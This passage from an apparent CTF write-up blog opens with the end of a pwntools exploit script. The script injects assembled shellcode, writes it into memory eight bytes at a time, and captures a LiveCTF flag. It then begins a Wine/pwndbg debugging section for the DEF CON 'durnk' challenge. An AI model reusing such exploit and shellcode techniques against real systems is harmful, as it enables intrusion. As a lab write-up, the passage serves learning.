</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 110
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    call rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3590</span>, libc<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1d8678</span>, writev_helper))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 110
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    call rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">0x3510</span><span style="color:#f92672">+</span>pie, libc<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50d70</span> , writev_helper))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 110
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    call rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">0x3500</span><span style="color:#f92672">+</span>pie,pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000000134D</span> , writev_helper))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range((len(pl))<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    writev(write_<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, u64(pl[i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>write_ <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1488</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    jmp rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(kk))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range((len(pl))<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    writev(write_<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, u64(pl[i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>writev(write_<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>, u64(p64(<span style="color:#ae81ff">0x9090909090909090</span>)))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;./submitter&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LiveCTF{&#39;</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Flag: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, flag)
</span></span></code></pre></div><h1 id="pwn---durnk-winapi">Pwn - durnk (winapi)</h1>
<p><a href="">Attachment</a></p>
<p>This is the first time I encountered a window executable run based on Wine. So, I will delve into it.</p>
<h2 id="what-is-wine">What is WINE</h2>
<blockquote>
<p>Wine (recursive backronym for Wine Is Not an Emulator) is a compatibility layer that aims to allow computer programs (application software and computer games) developed for Microsoft Windows to run on Unix-like operating systems. Wine emulates the Windows runtime environment by translating Windows system calls into POSIX-compliant system calls, recreating the directory structure of Windows systems, and providing alternative implementations of Windows system libraries (from wikipedia).</p>
</blockquote>
<ul>
<li>Not an emulator that creates a virtual machine in which the Windows application is then executed, but a translation layer between the application and the kernel. This layer creates an environment that makes the application ‘feel’ like it’s running on a Windows system, while in fact it is running on Linux.</li>
</ul>
<h2 id="debug">Debug</h2>
<p>When you have a wine application running and take a look at the active processes (for example via htop) you will notice that the application is listed as just an other Linux process. This means we can examine it using gdb!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/durnk/handout                                                                                                           16:41:49
</span></span><span style="display:flex;"><span>╰──➤ ps aux | grep <span style="color:#e6db74">&#34;challenge&#34;</span>
</span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">50236</span>  0.0  0.0  <span style="color:#ae81ff">67096</span>  <span style="color:#ae81ff">7728</span> pts/1    S+   16:24   0:00 Z:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\k</span>yrie<span style="color:#ae81ff">\C</span>TF<span style="color:#ae81ff">\2</span>024<span style="color:#ae81ff">\d</span>efcon<span style="color:#ae81ff">\d</span>urnk<span style="color:#ae81ff">\h</span>andout<span style="color:#ae81ff">\c</span>hallenge.exe
</span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">53976</span>  0.0  0.0  <span style="color:#ae81ff">67096</span>  <span style="color:#ae81ff">7980</span> pts/2    S+   16:38   0:00 Z:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\k</span>yrie<span style="color:#ae81ff">\C</span>TF<span style="color:#ae81ff">\2</span>024<span style="color:#ae81ff">\d</span>efcon<span style="color:#ae81ff">\d</span>urnk<span style="color:#ae81ff">\h</span>andout<span style="color:#ae81ff">\c</span>hallenge.exe
</span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">54639</span>  0.0  0.0  <span style="color:#ae81ff">12088</span>  <span style="color:#ae81ff">2432</span> pts/8    S+   16:41   0:00 grep --color<span style="color:#f92672">=</span>auto --exclude-dir<span style="color:#f92672">=</span>.bzr --exclude-dir<span style="color:#f92672">=</span>CVS --exclude-dir<span style="color:#f92672">=</span>.git --exclude-dir<span style="color:#f92672">=</span>.hg --exclude-dir<span style="color:#f92672">=</span>.svn --exclude-dir<span style="color:#f92672">=</span>.idea --exclude-dir<span style="color:#f92672">=</span>.tox challenge
</span></span></code></pre></div><p>Wine actually has it’s own debugger, <a href="https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine">WineDbg</a>. But I will ignore it and use pwndbg instead =))</p>
<p>I used the following small C program to explore the memory layout of the WINE process and compile this with this command (make sure we have mingw downloaded):</p>
<pre tabindex="0"><code class="language-shell!" data-lang="shell!">$ x86_64-w64-mingw32-gcc -o test.exe test.c
</code></pre><p><code>test.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> WINAPI <span style="color:#a6e22e">WinMain</span>(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span style="color:#66d9ef">int</span> nShowCmd)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;WinMain:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,WinMain);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HMODULE kernel32 <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;kernel32.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,kernel32);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;GetProcAddress:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,GetProcAddress);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HMODULE msvcrt <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;msvcrt.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;msvcrt.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,msvcrt);    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HMODULE ntdll <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ntdll.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,ntdll);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> dummy;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Stack:</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>dummy);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>heap <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">128</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Heap:</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,heap);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Run this test through Wine</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wine test.exe 
</span></span></code></pre></div><p>In another terminal, type this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gdb -p <span style="color:#66d9ef">$(</span>pgrep -f test.exe<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Let’s take a closer look at the memory of the test.exe process via gdb’s vmmap command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; vmmap
</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</span></span><span style="display:flex;"><span>             Start                End Perm     Size Offset File
</span></span><span style="display:flex;"><span>        0x7bb50000         0x7bb51000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bb51000         0x7bbc0000 r-xp    6f000   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbc0000         0x7bbc4000 rw-p     <span style="color:#ae81ff">4000</span>  <span style="color:#ae81ff">70000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbc4000         0x7bbdf000 r--p    1b000  <span style="color:#ae81ff">74000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbdf000         0x7bbe1000 rw-p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7bbdf<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7bbe1000         0x7bbe8000 r--p     <span style="color:#ae81ff">7000</span>  8f000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbe8000         0x7bbeb000 rw-p     <span style="color:#ae81ff">3000</span>  <span style="color:#ae81ff">96000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbeb000         0x7bea6000 r--p   2bb000  <span style="color:#ae81ff">99000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7fde0000         0x7ffc0000 ---p   1e0000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7fde0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7ffc0000         0x7ffe0000 rw-p    <span style="color:#ae81ff">20000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffc0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7ffe0000         0x7ffe1000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /tmp/.wine-1000/server-803-72295/tmpmap-6be2772d <span style="color:#f92672">(</span>deleted<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        0x7ffe1000         0x7ffe2000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffe1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7ffe2000         0x7fff0000 ---p     e000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffe2<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140000000        0x140001000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /home/kyrie/CTF/2024/defcon/durnk/handout/test.exe
</span></span><span style="display:flex;"><span>       0x140001000        0x140008000 r-xp     <span style="color:#ae81ff">7000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140001<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140008000        0x140009000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140008<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140009000        0x14000c000 r--p     <span style="color:#ae81ff">3000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140009<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x14000c000        0x14000d000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_14000c<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x14000d000        0x14000e000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">9000</span> /home/kyrie/CTF/2024/defcon/durnk/handout/test.exe
</span></span><span style="display:flex;"><span>       0x14000e000        0x140010000 rw-p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_14000e<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140010000        0x14007e000 r--p    6e000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140010<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x5555562bb000     0x5555562dc000 rw-p    <span style="color:#ae81ff">21000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffff440000     0x6fffff441000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff441000     0x6fffff4cd000 r-xp    8c000   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff4cd000     0x6fffff4d1000 rw-p     <span style="color:#ae81ff">4000</span>  8d000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff4d1000     0x6fffff4f8000 r--p    <span style="color:#ae81ff">27000</span>  <span style="color:#ae81ff">91000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff4f8000     0x6fffff4fb000 rw-p     <span style="color:#ae81ff">3000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_6fffff4f8<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffff4fb000     0x6fffff506000 r--p     b000  b8000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff506000     0x6fffff6d7000 rw-p   1d1000  c3000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff6d7000     0x6fffffa68000 r--p   <span style="color:#ae81ff">391000</span> <span style="color:#ae81ff">294000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffffa80000     0x6fffffa81000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffa81000     0x6fffffab2000 r-xp    <span style="color:#ae81ff">31000</span>   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffab2000     0x6fffffab5000 rw-p     <span style="color:#ae81ff">3000</span>  <span style="color:#ae81ff">32000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffab5000     0x6fffffac3000 r--p     e000  <span style="color:#ae81ff">35000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffac3000     0x6fffffac4000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_6fffffac3<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffffac4000     0x6fffffacf000 r--p     b000  <span style="color:#ae81ff">43000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffacf000     0x6fffffae2000 rw-p    <span style="color:#ae81ff">13000</span>  4e000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffae2000     0x6fffffc39000 r--p   <span style="color:#ae81ff">157000</span>  <span style="color:#ae81ff">61000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffc50000     0x6fffffc51000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffc51000     0x6fffffcbe000 r-xp    6d000   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcbe000     0x6fffffcc2000 rw-p     <span style="color:#ae81ff">4000</span>  6e000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcc2000     0x6fffffce5000 r--p    <span style="color:#ae81ff">23000</span>  <span style="color:#ae81ff">72000</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffce5000     0x6fffffce9000 rw-p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_6fffffce5<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffffce9000     0x6fffffcf4000 r--p     b000  <span style="color:#ae81ff">95000</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcf4000     0x6fffffcf6000 rw-p     <span style="color:#ae81ff">2000</span>  a0000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcf6000     0x6ffffffea000 r--p   2f4000  a2000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x79971c900000     0x79971cc00000 rw-p   <span style="color:#ae81ff">300000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971c900<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971cc00000     0x79971d442000 r--p   <span style="color:#ae81ff">842000</span>      <span style="color:#ae81ff">0</span> /usr/lib/locale/locale-archive
</span></span><span style="display:flex;"><span>    0x79971d500000     0x79971d600000 rw-p   <span style="color:#ae81ff">100000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d500<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d600000     0x79971d628000 r--p    <span style="color:#ae81ff">28000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d628000     0x79971d7bd000 r-xp   <span style="color:#ae81ff">195000</span>  <span style="color:#ae81ff">28000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d7bd000     0x79971d815000 r--p    <span style="color:#ae81ff">58000</span> 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d815000     0x79971d816000 ---p     <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">215000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d816000     0x79971d81a000 r--p     <span style="color:#ae81ff">4000</span> <span style="color:#ae81ff">215000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d81a000     0x79971d81c000 rw-p     <span style="color:#ae81ff">2000</span> <span style="color:#ae81ff">219000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d81c000     0x79971d829000 rw-p     d000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d81c<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d857000     0x79971d85a000 r--p     <span style="color:#ae81ff">3000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d85a000     0x79971d875000 r-xp    1b000   <span style="color:#ae81ff">3000</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d875000     0x79971d880000 r--p     b000  1e000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d880000     0x79971d881000 r--p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">28000</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d881000     0x79971d882000 rw-p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">29000</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d882000     0x79971d884000 r--p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d884000     0x79971d88e000 r-xp     a000   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d88e000     0x79971d891000 r--p     <span style="color:#ae81ff">3000</span>   c000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d891000     0x79971d892000 r--p     <span style="color:#ae81ff">1000</span>   e000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d892000     0x79971d893000 rw-p     <span style="color:#ae81ff">1000</span>   f000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d893000     0x79971d89d000 rw-p     a000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d893<span style="color:#f92672">]</span>
